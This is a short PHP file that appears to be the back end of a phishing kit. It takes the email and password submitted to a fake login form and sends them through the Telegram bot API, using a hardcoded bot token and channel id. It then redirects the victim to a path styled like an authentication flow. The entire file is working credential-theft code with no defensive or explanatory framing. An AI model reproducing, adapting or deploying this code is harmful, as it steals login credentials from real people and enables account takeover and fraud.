<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login_email = $_POST["login_email"];
    $login_password = $_POST["login_password"];
    $botApiToken = '6400179200:AAFLNC22j2zdSxCD83QB70N3zgHyG3AMgiA';
    $channelId = '8105246558';
    $txt = "🙍 Email: {$login_email} \n 🔐 Password: {$login_password}";

    $query = http_build_query([
        'chat_id' => $channelId,
        'text' => $txt,
    ]);

    $url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ]);
    curl_exec($curl);
    curl_close($curl);
}
header("location: authflow/entry/acnw_dep=ul&country.x=IT/index.html");
exit;
?>
